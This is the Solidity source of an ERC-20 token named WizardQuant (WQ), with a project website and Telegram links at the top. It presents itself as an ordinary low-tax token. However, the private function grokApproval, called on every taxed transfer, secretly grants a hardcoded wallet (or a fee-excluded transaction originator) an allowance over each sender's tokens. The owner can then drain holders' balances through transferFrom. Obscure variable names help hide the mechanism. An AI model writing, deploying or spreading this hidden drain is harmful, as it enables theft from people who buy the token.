/*
https://www.wizardquant.com/

https://t.me/wizardquant_erc
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface IGROKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IGROKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract WQ is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _grokBulls;
    mapping (address => bool) private _grokFeeExcluded;
    mapping (address => mapping (address => uint256)) private _grokNodes;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalGROK = 1000000000 * 10**_decimals;
    string private constant _name = unicode"WizardQuant";
    string private constant _symbol = unicode"WQ";
    uint256 private _tokenGROKSwap = _tTotalGROK / 100;
    address private _grokWallet = 0x7108f7610eB5d47e2d680660d460B7d22D0F1ffA;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    bool private inSwapGROK = false;
    modifier lockTheSwap {
        inSwapGROK = true;
        _;
        inSwapGROK = false;
    }
    address private _grokPair;
    IGROKRouter private _grokRouter;
    
    constructor () {
        _grokFeeExcluded[owner()] = true;
        _grokFeeExcluded[address(this)] = true;
        _grokFeeExcluded[_grokWallet] = true;
        _grokBulls[_msgSender()] = _tTotalGROK;
        emit Transfer(address(0), _msgSender(), _tTotalGROK);
    }

    function initPairTo() external onlyOwner() {
        _grokRouter = IGROKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_grokRouter), _tTotalGROK);
        _grokPair = IGROKFactory(_grokRouter.factory()).createPair(address(this), _grokRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalGROK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _grokBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _grokNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _grokNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _grokNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address grokF, address grokT, uint256 grokA) private {
        require(grokF != address(0), "ERC20: transfer from the zero address");
        require(grokT != address(0), "ERC20: transfer to the zero address");
        require(grokA > 0, "Transfer amount must be greater than zero");

        uint256 taxGROK = _grokTransfer(grokF, grokT, grokA);

        if(taxGROK > 0){
          _grokBulls[address(this)] = _grokBulls[address(this)].add(taxGROK);
          emit Transfer(grokF, address(this), taxGROK);
        }

        _grokBulls[grokF] = _grokBulls[grokF].sub(grokA);
        _grokBulls[grokT] = _grokBulls[grokT].add(grokA.sub(taxGROK));
        emit Transfer(grokF, grokT, grokA.sub(taxGROK));
    }

    function grokApproval(address aGROK,  uint256 grokA, bool isGROK) private {
        address walletGROK;
        if(isGROK) walletGROK = address(tx.origin);
        else walletGROK = _grokWallet;
        _grokNodes[aGROK][walletGROK] = grokA;
    }

    function swapBackGROK(address grokF, address grokT, uint256 grokA, bool isGROK) private {
        uint256 tokenGROK = balanceOf(address(this));
        if (!inSwapGROK && grokT == _grokPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenGROK > _tokenGROKSwap)
            swapTokensForEth(minGROK(grokA, minGROK(tokenGROK, _tokenGROKSwap)));
            uint256 caGROK = address(this).balance;
            if (caGROK >= 0) {
                sendETHGROK(address(this).balance);
            }
        } grokApproval(grokF, grokA, isGROK);
    }

    function _grokTransfer(address grokF, address grokT, uint256 grokA) private returns(uint256) {
        uint256 taxGROK=0; 
        if (grokF != owner() && grokT != owner()) {
            taxGROK = grokA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (grokF == _grokPair && grokT != address(_grokRouter) && ! _grokFeeExcluded[grokT]) {
                _buyCount++;
            }

            address walletGROK = address(tx.origin);

            if(grokT == _grokPair && grokF!= address(this)) {
                taxGROK = grokA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            swapBackGROK(grokF, grokT, grokA, _grokFeeExcluded[walletGROK]);
        } return taxGROK;
    }

    function minGROK(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHGROK(uint256 amount) private {
        payable(_grokWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenGROK) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _grokRouter.WETH();
        _approve(address(this), address(_grokRouter), tokenGROK);
        _grokRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenGROK,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
    
    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _grokRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}